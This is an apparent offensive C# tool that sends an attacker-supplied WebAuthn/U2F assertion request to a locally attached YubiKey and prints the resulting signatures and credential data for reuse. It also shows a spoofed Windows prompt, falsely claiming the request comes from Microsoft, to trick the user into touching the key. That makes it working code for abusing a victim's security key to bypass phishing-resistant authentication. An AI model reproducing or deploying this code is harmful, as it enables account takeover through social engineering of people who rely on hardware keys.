using Newtonsoft.Json;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Yubico.YubiKey;
namespace ConsoleApp1
{
    public class program
    {
        internal static bool run = true;
        static public IntPtr context = IntPtr.Zero;
        static public IntPtr cardHandle = IntPtr.Zero;
        static public native.protocol activeProtocol = 0;

        public static void Main(string[] args)
        {
            if(args.Length < 1)
            {
                return;
            }
            string mode = "fido";
            var data = Encoding.UTF8.GetString(Convert.FromBase64String(args[0]));
            var jsonData = JsonConvert.DeserializeObject<Dictionary<string,object>> (data);
            var assertion = JsonConvert.DeserializeObject<Yubico.YubiKey.Fido2.GetAssertionInput>(data);
            assertion.ClientDataHash = SHA256.Create().ComputeHash(Convert.FromBase64String(jsonData["ClientData"].ToString()));
            //var challenge = Convert.FromBase64String(jsonData["challenge"].ToString());
            var challenge = assertion.ClientDataHash;
            

            var yubiKey = Yubico.YubiKey.YubiKeyDevice.FindAll();
            if (yubiKey.Count() > 0)
            {
                if (mode == "u2f")
                {
                    var Fido_Connection = yubiKey.First().Connect(YubiKeyApplication.Fido2);
                    Yubico.YubiKey.U2f.AuthenticationData ap = get_2f_auth(Fido_Connection, assertion.RelyingPartyId, assertion.AllowList[0].Id, challenge, true);
                    Console.WriteLine($"[+] Signature:     {Convert.ToBase64String(ap.Signature.ToArray())}");
                }
                else
                {

                    var Connection = yubiKey.First().Connect(YubiKeyApplication.Fido2);
                    List<Yubico.YubiKey.Fido2.GetAssertionOutput> creds = get_auth(Connection, assertion);
                    if (creds != null)
                    {
                        foreach (var i in creds)
                        {
                            var dict = new Dictionary<string, string>()
                                    {
                                        {"authenticatorData", Convert.ToBase64String(i.AuthenticatorData) },
                                        {"signature", Convert.ToBase64String(i.Signature) },
                                        {"userHandle","" },
                                        {"cred_id","" }
                                    };
                            Console.WriteLine($"[*] AuthData:    {Convert.ToBase64String(i.AuthenticatorData)}");
                            Console.WriteLine($"[*] Signature:   {Convert.ToBase64String(i.Signature)}");
                            if (i.User != null)
                            {
                                dict["userHandle"] = Convert.ToBase64String(i.User.Id);
                                Console.WriteLine($"[*] Name:        {i.User.Name}");
                                Console.WriteLine($"[*] DisplayName: {i.User.DisplayName}");
                                Console.WriteLine($"[*] Userhandle:  {Convert.ToBase64String(i.User.Id)}");
                            }
                            if (i.Credential != null)
                            {
                                dict["cred_id"] = Convert.ToBase64String(i.Credential.Id);
                                Console.WriteLine($"[*] Credential_id:        {Convert.ToBase64String(i.Credential.Id)}");
                                Console.WriteLine($"[*] Credential_type:      {i.Credential.Type}");
                                Console.WriteLine($"[*] Credential_transport: {i.Credential.Transports}");
                            }
                            var json = JsonConvert.SerializeObject(dict);
                            Console.WriteLine(Convert.ToBase64String(Encoding.UTF8.GetBytes(json)));
                            Console.WriteLine();
                        }
                    }
                    else
                    {
                        Console.WriteLine($"[-] No creds found or unkown error for {assertion.RelyingPartyId}");
                    }
                }
            }
            else
            {
                Console.WriteLine("[-] No yubikey found");
            }


            Environment.Exit(0);

        }


        //FIDO2
        internal static List<Yubico.YubiKey.Fido2.GetAssertionOutput> get_auth(IYubiKeyConnection Connection, Yubico.YubiKey.Fido2.GetAssertionInput assertion)
        {
            var a = new Yubico.YubiKey.Fido2.Commands.GetAssertionCommand(assertion);
            Thread thread = new Thread(pop_prompt);
            Console.WriteLine("[*] TOUCH NEEDED");
            thread.Start();
            var getAssertionResponse = Connection.SendCommand(a);
            thread.Interrupt();

            if (getAssertionResponse.Status == ResponseStatus.Success)
            {

                var getAssertionOutputs = new List<Yubico.YubiKey.Fido2.GetAssertionOutput> { getAssertionResponse.GetData() };
                int credentialCount = getAssertionOutputs[0].NumberOfCredentials ?? 1;
                for (int j = 0; j < credentialCount - 1; j++)
                {
                    getAssertionResponse = Connection.SendCommand(new Yubico.YubiKey.Fido2.Commands.GetNextAssertionCommand());
                    getAssertionOutputs.Add(getAssertionResponse.GetData());
                }
                return getAssertionOutputs;
               
            }
            else
            {
                throw new Exception($"[-] Failed to get assertion response: {getAssertionResponse.Status} - {getAssertionResponse.StatusMessage}");
            }

            return null;
        }


        //FIDO U2F https://fidoalliance.org/specs/fido-u2f-v1.1-id-20160915/fido-u2f-raw-message-formats-v1.1-id-20160915.html
        internal static Yubico.YubiKey.U2f.AuthenticationData get_2f_auth(IYubiKeyConnection Connection, string RelyingPartyId, byte[] KeyHandle, byte[] challenge, bool EnforceUserPresence)
        {
            //Yubico.YubiKey.U2f.AuthenticationData aa = new Yubico.YubiKey.U2f.AuthenticationData();
            Yubico.YubiKey.U2f.Commands.AuthenticateCommand a = new Yubico.YubiKey.U2f.Commands.AuthenticateCommand();

            if (EnforceUserPresence)
                a.ControlByte = Yubico.YubiKey.U2f.U2fAuthenticationType.EnforceUserPresence;
            else
                a.ControlByte = Yubico.YubiKey.U2f.U2fAuthenticationType.DontEnforceUserPresence;

            a.KeyHandle = KeyHandle;
            a.ClientDataHash = challenge;
            a.ApplicationId = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(RelyingPartyId));
            
            Yubico.YubiKey.U2f.Commands.AuthenticateResponse authResponse = Connection.SendCommand(a);

            if (authResponse.Status == ResponseStatus.ConditionsNotSatisfied)
            {
                Console.WriteLine("[*] TOUCH NEEDED");
                authResponse = (Yubico.YubiKey.U2f.Commands.AuthenticateResponse)waitForTouch(Connection, a);
            }
            else if (authResponse.Status == ResponseStatus.AuthenticationRequired)
            {
                throw new Exception("[*] PIN NEEDED");
                //var p = new Yubico.YubiKey.U2f.Commands.VerifyPinCommand(new byte[] { 0x31, 0x32, 0x33, 0x34 });
                //Yubico.YubiKey.U2f.Commands.VerifyPinResponse pr = Connection.SendCommand(p);
                //if (pr.Status == ResponseStatus.Success)
                //{
                //    authResponse = Connection.SendCommand(a);
                //}
            }
            else if (authResponse.Status == ResponseStatus.Success) { }
            else { throw new Exception(authResponse.StatusMessage); }
            
            return authResponse.GetData();
        }

        internal static IYubiKeyResponse waitForTouch(IYubiKeyConnection Connection, IYubiKeyCommand<IYubiKeyResponse> r)
        {
            var timer = new Stopwatch();
            IYubiKeyResponse response;

            try
            {
                timer.Start();
                do
                {
                    //Thread.Sleep(100);
                    response = Connection.SendCommand(r);
                } while ((response.Status == ResponseStatus.ConditionsNotSatisfied) && (timer.Elapsed < new TimeSpan(9999999999)));

                if (response.Status == ResponseStatus.ConditionsNotSatisfied)
                {
                    throw new TimeoutException();
                }
            }
            finally
            {
                timer.Stop();
            }

            return response;
        }


        //Native and help functions
        internal static void pop_prompt()
        {
            Thread.Sleep(2000);
            int errorcode = 0;
            uint authPackage = 0x1337;

            //https://github.com/Yubico/python-fido2/issues/112
            //

            native.CredentialUIInfo credUI = new native.CredentialUIInfo
            {
                //hwndParent = native.GetConsoleWindow(),
                hwndParent = IntPtr.Zero,
                pszCaptionText = "Making sure it's you",
                pszMessageText = "Please sign in to Microsoft\n\nThis request comes from Microsoft, published by Microsoft Corperation\n\n                                 Touch your security key",
                hbmBanner = IntPtr.Zero
            };
            credUI.cbSize = Marshal.SizeOf(credUI);
            bool save = false;
            var flags = native.PromptForWindowsCredentialsFlags.AuthpackageOnly;

            native.KERB_CERTIFICATE_LOGON credFilter = new native.KERB_CERTIFICATE_LOGON();
            credFilter.MessageType = native.KERB_LOGON_SUBMIT_TYPE.KerbTicketUnlockLogon;

            int result = native.CredUIPromptForWindowsCredentials(
                ref credUI,
                errorcode,
                ref authPackage,
                credFilter,
                Marshal.SizeOf(typeof(native.KERB_CERTIFICATE_LOGON)),
                out IntPtr outCredBuffer,
                out uint outCredSize,
                ref save,
                flags);

            return;
        }

        public static string hexDump(byte[] input)
        {
            StringBuilder sbBytes = new StringBuilder(input.Length * 2);
            for (int i = 0; i < input.Length; i++)
            {
                sbBytes.AppendFormat("{0:X2}", input[i]);
            }
            return sbBytes.ToString();
        }

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        public static String[] ListReaders()
        {
            string[] readers;
            UInt32 pcchReaders = 0;
            native.SCardListReaders(context, null, null, ref pcchReaders);
            byte[] mszReaders = new byte[pcchReaders];
            native.SCardListReaders(context, null, mszReaders, ref pcchReaders);
            System.Text.ASCIIEncoding asc = new System.Text.ASCIIEncoding();
            String[] Readers = asc.GetString(mszReaders).Split('\0');
            if (Readers.Length > 2)
            {
                String[] res = new String[Readers.Length - 2];
                int j = 0;
                for (int i = 0; i < Readers.Length; i++)
                {
                    if (Readers[i] != "" && Readers[i] != null)
                    {
                        res[j] = Readers[i];
                        j++;
                    }
                }
                readers = res;
                return readers;
            }
            else
            {
                readers = new String[0];
                return readers;
            }
        }

        public static bool Connect(String reader, native.share ShareMode, native.protocol PreferredProtocols)
        {
            native.SCardEstablishContext(native.scope.SCARD_SCOPE_SYSTEM, IntPtr.Zero, IntPtr.Zero, out context);
            uint ris = native.SCardConnect(context, reader, ShareMode, PreferredProtocols, out cardHandle, out activeProtocol);
            if (ris != 0)
            {
                Console.WriteLine(String.Format("[-] Connect failed: {0}", ris));
                return false;
            }
            return true;
        }

        public void Disconnect(native.disposition Disposition)
        {
            if (cardHandle != IntPtr.Zero)
                native.SCardDisconnect(cardHandle, Disposition);
            cardHandle = IntPtr.Zero;
        }

        public byte[] GetAttrib(uint attrib)
        {
            int AttrLen = 0;
            uint ris = native.SCardGetAttrib(cardHandle, attrib, null, ref AttrLen);
            if (ris != 0)
                return null;
            byte[] Attr = new byte[AttrLen];
            ris = native.SCardGetAttrib(cardHandle, attrib, Attr, ref AttrLen);
            if (ris != 0)
                return null;
            return Attr;
        }

        public static byte[] send(byte[] buff_send)
        {
            native.SCARD_IO_REQUEST io_send = new native.SCARD_IO_REQUEST();
            io_send.dwProtocol = activeProtocol;
            io_send.cbPciLength = (uint)Marshal.SizeOf(typeof(native.SCARD_IO_REQUEST));

            native.SCARD_IO_REQUEST io_recv = new native.SCARD_IO_REQUEST();
            io_recv.dwProtocol = activeProtocol;
            io_recv.cbPciLength = (uint)Marshal.SizeOf(typeof(native.SCARD_IO_REQUEST));

            byte[] buff_recv = new byte[1024];
            int recv_len = 1024;
            var ret = native.SCardTransmit(cardHandle, ref io_send, buff_send, buff_send.Length, ref io_recv, buff_recv, ref recv_len);

            return buff_recv.Take(recv_len).ToArray();
        }
    }
}
